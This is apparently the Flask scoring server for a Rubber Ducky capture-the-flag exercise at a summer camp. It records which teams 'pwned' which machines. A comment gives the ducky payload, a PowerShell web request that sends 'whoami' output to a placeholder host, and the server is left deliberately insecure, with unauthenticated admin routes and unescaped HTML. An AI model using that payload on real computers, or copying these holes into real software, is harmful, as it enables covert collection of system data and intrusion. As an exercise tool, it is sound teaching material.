from flask import Flask,request,redirect
from Machine import Computer
import base64
import re
from urllib.parse import parse_qs
import sys
import os

#This code is for the Rubber Ducky activity in the CTF activity used at the Radford Summer Camps
#Sorry this code is a mess, it was made very quickly and had to be fixed during the activity
#Before starting this code, find each mention of <Edit this> to find each variable that must be changed before running

#database setup, checks if information file is given in program parameters, if not, uses default filename
if len(sys.argv) > 1:
    #checks if the file exists
    if os.path.exists(sys.argv[1]):
        InformationFile = sys.argv[1]
    else:
        print("FilePath Does not exist")
        exit()
else:
    #If file not given, default to Info.txt. If that file does not exist, it will give up on loading the information and create the file at the termination of the program 
    InformationFile = "Info.txt"

#Information is a dictionary that holds a a custom "Computer" datatype containing information on a computer that has been "hacked" paired to the ip address of the computer. (This may be able to be improved by changing from a dictionary to a regular list since ip address will also be in the computer object.)
Information = {}
#style sheet for website, not linked in website as this is dynamic, instead content is appended to the head
cssfile = "WebMain.css"
#<Edit this> On CTFd website, each team is given a teamid, this maps the teamnames to team id's. Edit this to match the CTFd server name maps
TeamNames = {1:"admin",2:"test",3:"user 1",8:"Teamone",9:"Teamtwo",10:"Teamthree",11:"Teamfour"}

head = "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n"
head += "<style>\n"
head += open(cssfile, 'r').read()
head += "</style>\n"
head += "</head>\n<body>\n"

end = "\n</body>\n</html>"

#loads saved information from file
def load_information(Information):
    # This try just checks if the file exists
    try:
        #for line in informationfile, take information, divide it into it's sections, create Computer object with the data in that information line, add Computer object to dictionary
        with open(InformationFile, 'r') as f:
            for line in f:
                ip, CompName, users, pwnTeams, TeamID = line.strip().split('\x1f')
                machine = Computer(ip=ip, CompName=CompName, ID=int(TeamID))
                for i in users.strip('[]').split(','):
                    machine.add_user(i.strip(' ').strip("'"))
                for i in range(0,len(pwnTeams.split(','))):
                    print("loading pwns")
                    if ':' in pwnTeams:
                        print(f"adding pwn: id: {int(pwnTeams.strip('{}').split(',')[i].split(':')[0].strip())} | Scored: {pwnTeams.strip('{}').split(',')[i].split(':')[1].strip()}")
                        if pwnTeams.strip('{}').split(',')[i].split(':')[1].strip() == 'True':
                            machine.load_pwn(int(pwnTeams.strip('{}').split(',')[i].split(':')[0].strip()), True)
                        else:
                            machine.load_pwn(int(pwnTeams.strip('{}').split(',')[i].split(':')[0].strip()), False)
                Information[ip] = machine
    except FileNotFoundError:
        pass

#saves information from a the information dictionary into the info file. Creates info file if it doesn't exist. Uses \x1f as seperators
def save_information(Information):
    with open(InformationFile, 'w') as f:
        for ip, machine in Information.items():
            f.write(f"{ip}\x1f{machine.CompName}\x1f{machine.users}\x1f{machine.PwnTeams}\x1f{machine.TeamID}\n")

# Creates website object
app = Flask(__name__)

# Main page displays list of pwned computers with information on the computer and what team's pwned them
@app.route('/')
def index():
    body = "<div class=\"container\">\n"
    for ip, machine in Information.items():
        body += f"<div class=\"info-block\">\n"
        body += f"<h1 class=\"info-title\">{ip}</h1>\n"
        if machine.TeamID == 0:
            body += f"<h2>Team: Unknown</h2>\n"
        else:
            body += f"<h2>Team: {TeamNames[machine.TeamID]}</h2>\n"
        body += f"<h3>ComputerName: {machine.CompName}</h3>\n"
        body += f"<h3>Users: {list(machine.users)}</h3>\n"
        body += f"<h2>Pwned By</h2>\n"
        body += f"{machine.get_pwns()}\n"
        body += f"</div>\n"
    body += "</div>\n"
    return head + body + end

# This route is linked at each team in the Pwned By section
# This displays how many pwns a team has gotten
@app.route('/team/<int:teamnum>')
def more_info(teamnum):
    amount = 0
    for i in Information:
        if teamnum in Information[i].PwnTeams:
            if Information[i].PwnTeams[teamnum]:
                amount += 1
    return head + f"<p>Team {TeamNames[teamnum]} has pwned {amount} machines</p>\n" + end


#This is how the rubber duckies send computer information to the main page
#*If there are any vulnerabilities in the code this is where they will likely be, This code was used with people semi new to cyber and thus didn't see much need to spend time securing*
@app.route('/sendinfo', methods=['POST'])
def add_info():
    FormData = request.form.to_dict()
    print(f"Received information from {request.remote_addr}")
    print(f"Data: {FormData}")

    # This is the command on each rubber ducky, it sends a web request to this route with the data of which team the usb belonged to and the username of the computer pwned
    # powershell iwr http://ip:port/sendinfo -Method POST -Body @{profile=(whoami);team=(4)}

    #if ip hasn't been pwned yet, create new Computer object and add it to Information Object
    if request.remote_addr not in Information:
        if ('profile' in request.form) and ('team' in request.form):
            #automatically sets ID to 0, The Computer object will query the CTFd server to see what team id the ip belongs to and change that. If it can't find one the ID will stay 0
            newmachine = Computer(ip=request.remote_addr, CompName=request.form['profile'].split('\\')[0], ID=0)
            newmachine.add_user(request.form['profile'].split('\\')[1])
            newmachine.add_pwn(int(request.form['team']))
            Information[request.remote_addr] = newmachine
        else:
            return 'No profile provided', 200
    else:
        Information[request.remote_addr].add_pwn(int(request.form['team']))
        return 'IP already exists', 200
    return 'Info received', 200

# Admin commands
# You can further protect these by only letting a certain ip access them or password protecting them, I just did this because it was quick and easy

# This route lets you clear the information dictionary
@app.route('/ADm1n/clear')
def clear_information():
    Information.clear()
    save_information(Information)
    return redirect('/')

# This lets you manually set the teamid for an IP incase it is broken, this is a last resort as there are other routes to check all id's
@app.route('/ADm1n/edit/<ip>/<team>', methods=['GET'])
def edit_information(ip, team):
    Information[ip].make_team(int(team))
    return redirect('/')

# If can there are any teamID's of 0, you can use this to requery the CTFd website and get any teamID's that didn't update
@app.route('/ADm1n/CheckTeams', methods=['GET'])
def CheckTeams():
    check = ""
    for i in Information:
        Information[i].GetTeamID()
        Information[i].count_Score()
        check += f"{i}:{Information[i].TeamID}\n"
    return head + f"<pre>{check}</pre>" + end

if __name__ == '__main__':
    load_information(Information)
    # <Edit this> Change the ip address to the host IP address, You may have to host this on the same server as the CTFd instance so that each computer can send it information. I was able to selfhost though
    app.run(host='0.0.0.0', port=2727)
    save_information(Information)
